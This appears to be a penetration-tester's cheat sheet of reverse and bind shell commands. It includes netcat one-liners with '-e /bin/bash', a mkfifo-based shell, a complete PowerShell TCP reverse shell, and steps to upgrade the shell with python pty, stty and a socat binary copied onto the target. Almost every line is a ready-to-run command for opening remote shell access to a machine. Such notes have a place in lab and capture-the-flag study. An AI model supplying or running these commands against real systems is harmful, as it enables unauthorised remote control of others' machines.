```nc -lvnp 192.168.1.1 8181``` : Create listener 

```nc <LOCAL-IP> <PORT> -e /bin/bash``` : Execute bash on connection 

```nc 192.168.1.2 8181``` : Bind to listener @ 192.168.1.2:8181

```nc -lvnp <PORT> -e /bin/bash``` : Execute bash on connection to listener. Can be used as bind shell

note: -e is not included in most versions of netcat due to its insecurity. On windows can use a static binary, while on linux we can use.

```mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f``` : bind shell

```mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f``` : reverse shell
  
```powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"``` : powershell reverse shell

Stabilizing netcat reverse shell on linux.
technique 1.

1. ```python -c 'import pty;pty.spawn("/bin/bash")'``` : replace python with python2 or python3 where necessary
2. ```export TERM=xterm``` : this will give us access to term commands such as clear
3. background the shell using Ctrl + Z. and then do ```stty raw -echo; fg``` : turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

technique 2.
with rlwrap listener(not installed by default)
1. background the shell using Ctrl + Z. and then do ```stty raw -echo; fg``` : turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

technique 3.
transfer socat static compiled binary to target machine. (wget on linux or invoke-webrequest on windows)

change your terminal tty size
open another terminal and run ```stty -a```. Note down the values for "rows" and columns:

based on output values type in:

stty rows <number> 
  
stty cols <number>
